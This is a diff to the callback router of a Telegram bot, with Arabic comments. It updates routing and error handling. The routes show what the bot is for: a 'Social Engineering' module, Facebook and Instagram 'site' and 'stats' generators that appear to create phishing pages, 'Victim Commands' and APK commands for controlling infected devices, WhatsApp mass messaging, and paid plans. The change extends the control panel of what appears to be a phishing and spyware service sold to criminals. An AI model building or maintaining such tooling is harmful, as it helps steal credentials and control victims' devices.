@@ -1,6 +1,6 @@
 # bot_handlers/callbacks/router.py
 # ============================================================
-# Router v6.2 — مع Force Subscribe + WhatsApp Blast + WhatsApp Report
+# Router v6.3 — مع Force Subscribe + WhatsApp Blast + WhatsApp Report
 # ============================================================
 
 from config import bot
@@ -91,7 +91,7 @@ except Exception as e:
 # ============================================================
 ROUTES = [
     # ═══════════════════════════════════════════════════════
-    # [1] WhatsApp Report
+    # [0] WhatsApp Report
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "wa_report_start"
               or d == "wa_report_help"
@@ -104,12 +104,12 @@ ROUTES = [
      wa_report_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [2] WhatsApp Blast
+    # [1] WhatsApp Blast
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "admin_wb_menu" or d.startswith("wbr_"), handle_wb_callback),
 
     # ═══════════════════════════════════════════════════════
-    # [3] Points / Settings
+    # [2] Points / Settings
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "settings_menu"
               or d == "points_menu"
@@ -120,63 +120,69 @@ ROUTES = [
               or d.startswith("tool_confirm_"), points_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [4] Social Engineering
+    # [3] Social Engineering
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "gen_se" or d.startswith("se_"), se_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [5] Misc
+    # [4] Misc
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "noop", misc_cb.handle),
     (lambda d: d == "back_to_main", misc_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [6] Help
+    # [5] Help
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "help_guide" or d.startswith("help_page_"), help_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [7] Search
+    # [6] Search
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "search_menu" or d.startswith("search_"), search_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [8] Facebook
+    # [7] Facebook — مع fb_show_panel
     # ═══════════════════════════════════════════════════════
-    (lambda d: d == "gen_fb" or d.startswith("fb_site_") or d.startswith("fb_stats_"), fb_cb.handle),
+    (lambda d: d == "gen_fb" 
+              or d == "fb_show_panel"
+              or d.startswith("fb_site_") 
+              or d.startswith("fb_stats_"), fb_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [9] Instagram
+    # [8] Instagram — مع ig_show_panel
     # ═══════════════════════════════════════════════════════
-    (lambda d: d == "gen_ig" or d.startswith("ig_site_") or d.startswith("ig_stats_"), ig_cb.handle),
+    (lambda d: d == "gen_ig" 
+              or d == "ig_show_panel"
+              or d.startswith("ig_site_") 
+              or d.startswith("ig_stats_"), ig_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [10] Silent
+    # [9] Silent
     # ═══════════════════════════════════════════════════════
     (lambda d: d in ("gen_silent", "silent_new", "silent_stats", "silent_recent"), silent_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [11] Dashboard
+    # [10] Dashboard
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "open_dashboard", dash_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [12] Payment
+    # [11] Payment
     # ═══════════════════════════════════════════════════════
     (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [13] Updates
+    # [12] Updates
     # ═══════════════════════════════════════════════════════
     (lambda d: d.startswith("upd_"), upd_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [14] Admin
+    # [13] Admin
     # ═══════════════════════════════════════════════════════
     (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),
 
     # ═══════════════════════════════════════════════════════
-    # [15] Victim Commands
+    # [14] Victim Commands
     # ═══════════════════════════════════════════════════════
     (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),
     (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),
@@ -261,12 +267,23 @@ def callback_handler(call):
                     handler(call, chat_id, user_id, data)
                     return
             except Exception as e:
-                logger.exception(f"[CALLBACK] route #{idx} error for '{data}': {e}")
+                # تجنب التعامل مع أخطاء الـ timeout
+                err_str = str(e).lower()
+                if "query is too old" in err_str or "query id is invalid" in err_str:
+                    logger.warning(f"[CALLBACK] route #{idx} — query expired for '{data}'")
+                else:
+                    logger.exception(f"[CALLBACK] route #{idx} error for '{data}': {e}")
                 continue
 
         logger.warning(f"[CALLBACK] ⚠️ Unhandled callback: '{data}'")
-        bot.answer_callback_query(call.id)
+        try:
+            bot.answer_callback_query(call.id)
+        except Exception as e:
+            if "query is too old" not in str(e).lower():
+                logger.debug(f"answer_callback_query failed: {e}")
 
     except Exception as e:
-        logger.exception(f"[CALLBACK] handler error: {e}")
+        err_str = str(e).lower()
+        if "query is too old" not in err_str:
+            logger.exception(f"[CALLBACK] handler error: {e}")
         metrics.inc_counter("bot_errors", tags={"type": "callback"})
